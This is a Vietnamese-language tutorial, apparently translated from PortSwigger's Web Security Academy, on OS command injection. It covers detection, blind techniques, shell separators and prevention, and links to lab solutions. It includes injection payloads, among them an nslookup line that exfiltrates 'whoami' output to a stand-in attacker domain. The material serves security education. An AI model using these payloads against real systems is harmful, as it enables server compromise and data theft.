# OS command injection  
Trong phần này, chúng tôi giải thích tấn công chèn lệnh hệ điều hành là gì, và mô tả cách phát hiện và khai thác các lỗ hổng. Chúng tôi cũng giới thiệu một số lệnh và kỹ thuật hữu ích cho các hệ điều hành khác nhau, và mô tả cách ngăn chặn tấn công chèn lệnh hệ điều hành.  

# Chèn lệnh hệ điều hành là gì?  
Tấn công chèn lệnh hệ điều hành (OS command injection), còn được gọi là tấn công chèn shell, cho phép kẻ tấn công thực thi các lệnh hệ điều hành trên máy chủ đang chạy ứng dụng, và thường dẫn đến việc ứng dụng và dữ liệu của nó bị xâm phạm hoàn toàn. Thông thường, kẻ tấn công có thể lợi dụng lỗ hổng chèn lệnh hệ điều hành để xâm phạm các phần khác của cơ sở hạ tầng lưu trữ và khai thác các mối quan hệ tin cậy để chuyển hướng tấn công sang các hệ thống khác trong tổ chức.  

# Chèn lệnh hệ điều hành  
Trong ví dụ này, một ứng dụng mua sắm cho phép người dùng xem mặt hàng đó có còn hàng tại một cửa hàng cụ thể hay không. Thông tin này được truy cập thông qua một URL:  

`https://insecure-website.com/stockStatus?productID=381&storeID=29`  

Để cung cấp thông tin tồn kho, ứng dụng phải truy vấn nhiều hệ thống cũ. Vì lý do lịch sử, chức năng này được thực hiện bằng cách gọi một lệnh shell với ID sản phẩm và ID cửa hàng làm đối số:  

`stockreport.pl 381 29`  

Lệnh này xuất ra trạng thái tồn kho của mặt hàng được chỉ định, và trả về kết quả cho người dùng.  

Ứng dụng không có bất kỳ biện pháp phòng vệ nào chống lại tấn công chèn lệnh hệ điều hành, do đó kẻ tấn công có thể nhập các lệnh sau để thực thi một lệnh tùy ý:  

`& echo aiwefwlguh &`  

Nếu dữ liệu đầu vào này được gửi trong `productID` tham số, lệnh mà ứng dụng sẽ thực thi là:  

`stockreport.pl & echo aiwefwlguh & 29`  

Lệnh này `echo` khiến chuỗi được cung cấp được hiển thị lại trong kết quả đầu ra. Đây là một cách hữu ích để kiểm tra một số loại tấn công chèn lệnh hệ điều hành. `&` Ký tự này là dấu phân cách lệnh shell. Trong ví dụ này, nó khiến ba lệnh riêng biệt được thực thi, lần lượt từng lệnh một. Kết quả trả về cho người dùng là:  

```
Error - productID was not provided
aiwefwlguh
29: command not found
```  

Ba dòng kết quả đầu ra này chứng minh rằng:  

* Lệnh ban đầu `stockreport.pl` được thực thi mà không có các đối số dự kiến, do đó trả về thông báo lỗi.    
* Lệnh được chèn vào `echo` đã được thực thi và chuỗi được cung cấp đã được hiển thị trong kết quả đầu ra.  
* Đối số ban đầu `29` được thực thi như một lệnh, dẫn đến lỗi.  

Việc đặt thêm dấu phân cách lệnh `&` sau lệnh được chèn rất hữu ích vì nó tách lệnh được chèn khỏi bất cứ thứ gì theo sau điểm chèn. Điều này làm giảm khả năng những gì theo sau sẽ ngăn cản lệnh được chèn thực thi.  

### Thực hành: Tấn công chèn lệnh hệ điều hành, trường hợp đơn giản  
[Solved](https://github.com/ncKien05/PortSwigger/blob/main/Command%20Injection/Solution/lab1.py)  

# Các lệnh hữu ích  

Sau khi xác định được lỗ hổng tấn công chèn lệnh hệ điều hành, việc thực hiện một số lệnh ban đầu để thu thập thông tin về hệ thống là rất hữu ích. Dưới đây là tóm tắt một số lệnh hữu ích trên nền tảng Linux và Windows:  

| Mục đích của mệnh lệnh | Linux | Windows |
| :--- | :--- | :--- |
| Tên người dùng hiện tại | `whoami` | `whoami` |
| Hệ điều hành | `uname -a` | `ver` |
| Cấu hình mạng | `ifconfig` | `ipconfig /all` |
| Kết nối mạng | `netstat -an` | `netstat -an` |
| Đang chạy các quy trình | `ps -ef` | `tasklist` |  

# Các lỗ hổng tấn công chèn lệnh Blind OS  
Nhiều trường hợp tấn công chèn lệnh hệ điều hành là các lỗ hổng "mù". Điều này có nghĩa là ứng dụng không trả về kết quả đầu ra từ lệnh trong phản hồi HTTP của nó. Các lỗ hổng "mù" vẫn có thể bị khai thác, nhưng cần các kỹ thuật khác nhau.  

Ví dụ, hãy tưởng tượng một trang web cho phép người dùng gửi phản hồi về trang web đó. Người dùng nhập địa chỉ email và nội dung phản hồi. Ứng dụng phía máy chủ sau đó sẽ tạo một email gửi đến quản trị viên trang web chứa phản hồi đó. Để làm điều này, nó sẽ gọi đến chương trình `mail` với các thông tin đã được gửi:  

`mail -s "This site is great" -aFrom:peter@normal-user.net feedback@vulnerable-website.com`  

Kết quả đầu ra từ `mail` lệnh (nếu có) sẽ không được trả về trong phản hồi của ứng dụng, vì vậy việc sử dụng payload `echo` sẽ không hiệu quả. Trong trường hợp này, bạn có thể sử dụng nhiều kỹ thuật khác để phát hiện và khai thác lỗ hổng.  

## Phát hiện tấn công chèn lệnh hệ điều hành mù bằng cách sử dụng độ trễ thời gian  

Bạn có thể sử dụng lệnh được chèn để kích hoạt độ trễ thời gian, cho phép bạn xác nhận rằng lệnh đã được thực thi dựa trên thời gian phản hồi của ứng dụng. `ping` Lệnh này là một cách tốt để thực hiện việc này, vì nó cho phép bạn chỉ định số lượng gói ICMP cần gửi. Điều này cho phép bạn kiểm soát thời gian thực thi của lệnh:  

`& ping -c 10 127.0.0.1 &`  

### Thí nghiệm: Tấn công chèn lệnh hệ điều hành mù với độ trễ thời gian  
[SOLUTION](https://github.com/ncKien05/PortSwigger/blob/main/Command%20Injection/Solution/lab2.py)  

## Khai thác lỗ hổng tấn công chèn lệnh hệ điều hành ngầm bằng cách chuyển hướng đầu ra.  

Bạn có thể chuyển hướng đầu ra từ lệnh được chèn vào một tệp trong thư mục gốc của trang web, sau đó bạn có thể truy xuất tệp đó bằng trình duyệt. Ví dụ, nếu ứng dụng cung cấp các tài nguyên tĩnh từ vị trí hệ thống tệp `/var/www/static`, thì bạn có thể gửi đầu vào sau:  

`& whoami > /var/www/static/output.txt &`  

Nhân vật này `>` sẽ gửi kết quả đầu ra từ `whoami` lệnh đến tệp được chỉ định. Sau đó, bạn có thể sử dụng trình duyệt `https://vulnerable-website.com/whoami.txt` để tải xuống tệp và xem kết quả đầu ra từ lệnh đã được chèn.  

### Thực hành: Tấn công chèn lệnh hệ điều hành ẩn với chuyển hướng đầu ra  
[SOLUTION](https://github.com/ncKien05/PortSwigger/blob/main/Command%20Injection/Solution/lab3.py)  

## Khai thác lỗ hổng tấn công chèn lệnh hệ điều hành ẩn bằng kỹ thuật ngoài băng tần (OAST).  

Bạn có thể sử dụng một lệnh được chèn vào để kích hoạt tương tác mạng ngoài băng tần với một hệ thống mà bạn điều khiển, bằng cách sử dụng các kỹ thuật OAST. Ví dụ:  

`& nslookup kgji2ohoyw.web-attacker.com &`  

Đoạn mã độc này sử dụng `nslookup` lệnh để thực hiện tra cứu DNS cho tên miền được chỉ định. Kẻ tấn công có thể theo dõi xem quá trình tra cứu có diễn ra hay không, để xác nhận xem lệnh đã được chèn thành công hay chưa.  

### Thực hành: Tấn công chèn lệnh hệ điều hành mù với tương tác ngoài băng tần  
[SOLUTION](https://github.com/ncKien05/PortSwigger/blob/main/Command%20Injection/Solution/lab4.py)  

Kênh ngoài băng tần cung cấp một cách dễ dàng để trích xuất dữ liệu đầu ra từ các lệnh được chèn vào:  

```& nslookup `whoami`.kgji2ohoyw.web-attacker.com &```

Điều này dẫn đến việc tra cứu DNS đến tên miền của kẻ tấn công, chứa kết quả của `whoami` lệnh:  

`wwwuser.kgji2ohoyw.web-attacker.com`  

### Thực hành: Tấn công chèn lệnh hệ điều hành mù với rò rỉ dữ liệu ngoài băng tần  
[SOLUTION](https://github.com/ncKien05/PortSwigger/blob/main/Command%20Injection/Solution/lab5.py)  

# Các phương pháp chèn lệnh hệ điều hành  

Bạn có thể sử dụng một số ký tự đặc biệt của shell để thực hiện các cuộc tấn công chèn lệnh hệ điều hành.  

Một số ký tự đóng vai trò là dấu phân cách lệnh, cho phép các lệnh được nối tiếp nhau. Các dấu phân cách lệnh sau đây hoạt động trên cả hệ thống Windows và Unix:  

```
&
&&
|
||
```

Các dấu phân cách lệnh sau chỉ hoạt động trên các hệ thống dựa trên Unix:  

* `;`
* Dòng mới (`0x0a` hoặc `\n`)  

Trên các hệ thống dựa trên Unix, bạn cũng có thể sử dụng dấu ngoặc kép ngược hoặc ký tự đô la để thực thi trực tiếp một lệnh được chèn vào trong lệnh gốc:  

* ``` ` ``` 

lệnh được chèn ``` ` ```
* `$(` 

lệnh được chèn `)` 

Các ký tự đặc biệt khác nhau của shell có những hành vi khác biệt tinh tế, có thể ảnh hưởng đến việc chúng có hoạt động hiệu quả trong những tình huống nhất định hay không. Điều này có thể ảnh hưởng đến việc chúng cho phép truy xuất đầu ra lệnh trực tiếp hay chỉ hữu ích cho việc khai thác mù quáng.

Đôi khi, phần nhập liệu mà bạn điều khiển xuất hiện trong dấu ngoặc kép trong lệnh gốc. Trong trường hợp này, bạn cần kết thúc ngữ cảnh được trích dẫn (sử dụng `"` hoặc `'`) trước khi sử dụng các ký tự đặc biệt của shell phù hợp để chèn một lệnh mới.  

# Cách phòng ngừa các cuộc tấn công chèn lệnh hệ điều hành  

Cách hiệu quả nhất để ngăn chặn các lỗ hổng tấn công chèn lệnh hệ điều hành là không bao giờ gọi các lệnh hệ điều hành từ mã ở lớp ứng dụng. Trong hầu hết các trường hợp, có nhiều cách khác nhau để triển khai chức năng cần thiết bằng cách sử dụng các API nền tảng an toàn hơn.  

Nếu bạn cần gọi các lệnh của hệ điều hành với dữ liệu đầu vào do người dùng cung cấp, thì bạn phải thực hiện xác thực dữ liệu đầu vào một cách nghiêm ngặt. Một số ví dụ về xác thực hiệu quả bao gồm:  

* Kiểm tra tính hợp lệ dựa trên danh sách các giá trị được cho phép.  
* Kiểm tra xem dữ liệu đầu vào có phải là số hay không.  
* Kiểm tra xem dữ liệu đầu vào chỉ chứa các ký tự chữ và số, không có cú pháp hoặc khoảng trắng nào khác.  

Tuyệt đối không nên cố gắng làm sạch dữ liệu đầu vào bằng cách thoát các ký tự đặc biệt của shell. Trên thực tế, cách này quá dễ gây lỗi và dễ bị kẻ tấn công lành nghề vượt qua.  
